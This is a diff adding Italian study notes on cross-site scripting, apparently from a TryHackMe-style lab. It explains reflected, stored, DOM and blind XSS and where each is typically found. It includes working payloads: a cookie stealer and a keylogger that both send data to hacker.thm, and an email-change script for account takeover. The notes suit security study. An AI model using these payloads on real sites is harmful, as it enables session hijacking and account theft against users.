@@ -1,0 +1,66 @@
+	XSS PAYLOADS
+Cross-Site Scripting
+è un attacco in cui un payload in codice JavaScript viene caricato nell'applicazione web, che ne legge
+ed esegue lo script sul bersaglio. 
+2 PARTI:
+-Intenzione: cosa vogliamo ottenere dal JavaScript
+-Modifica: qual è la modifica che vogliamo fare al codice, per far sì che venga eseguito
+
+Esempi di INTENZIONI:
+-Proof of Concept: un payload semplice che serve per mostrare che è effettivamente possibile eseguire
+			un XSS sul sito
+<script>alert('XSS');</script>
+
+-Session Stealing: il suo compito è quello di rubare i cookies di sessione e log di un utente e
+			postarli al sito indicato
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+-Key Logger: questo tipo di payload legge tutti gli input scritti sulla webpage e verranngo poi
+		mandati a un sito indicato dall'hacker
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+-Business Logic: questo è un tipo di payload molto più specifico, perchè potrebbe essere usato 
+		  ad esempio per modificare la mail inserita, con una dell'hacker impostata dallo 			script, potendo poi effettuare un reset password ed accedere all'account
+<script>user.changeEmail('attacker@hacker.thm');</script>
+
+Il Token di sessione potrebbe trovarsi all'interno del documento document.cookie
+
+Un metodo JavaScript utilizzato spesso per PoC è 'alert'
+
+===================================================================================================
+	REFLECTED XSS
+Sono quegli attacchi XSS che riportano informazioni all'attaccante. Come nel caso del Session Stealing.
+DOVE TROVARLI?
+-Parametri delle stringhe query degli URL
+-Percorso file dell'URL
+(a volte anche negli Header HTTP, ma non è quasi praticamente possibile)
+##
+	STORED XSS
+Come implica il nome, sono XSS che vengono immagazzinati dalla web app (per esempio nel database) e poi 
+viene eseguito quando un utente visita il sito/web page.
+ESEMPIO: Una pagina ci permette di postare commenti, che salveranno nel database questo JavaScript: ogni volta che un utente visiterà quella pagina si attiverà l'XSS nel loro browser.
+All'attaccante potrebbero arrivare i cookies di sessione e continuare ad eseguire azioni come se fosse
+l'utente vittima.
+Un payload XSS potrebbe essere memorizzato da un website in un database.
+DOVE TROVARLI?
+-Commenti
+-Informazioni del Profilo Utente
+-Liste Website
+##
+	DOM XSS
+Sono attacchi XSS che avvengono sfruttando il Document Object Model; succede quando l'esecuzione del
+JavaScript viene fatta direttamente nel browser senza alcuna nuova pagina caricata o dati inviati al
+codice back-end, l'esecuzione parte quando il website ha un input dal JavaScript o un'interazione
+di un utente.
+DOVE TROVARLI?
+-Parti del codice che accedono a determinate variabili come 'window.location.x'. 
+-Metodi JavaScript, come 'eval()'
+##
+	BLIND XSS
+Funziona come un StoredXSS ma qui non possiamo vedere il payload 'attivarsi' o testarlo noi stessi.
+ESEMPIO: Pagina di invio Ticket di Supporto, ci puoi scrivere ciò che puoi e non è controllata per
+input maliziosi, inserendo un payload che si eseguirà quando lo Staff visualizzerà il ticket.
+E' importante avere una richiamata sul payload, come una richiesta HTTP, in modo tale di sapere quando il payload verrà eseguito.
+Un tool importante per un Blind XSS è: xsshunter
+Con il payload corretto un attaccante potrebbe ottenere la richiamata all'URL del portale dello 
+Staff, cookies, e anche contenuti visualizzati nella pagina del portale.
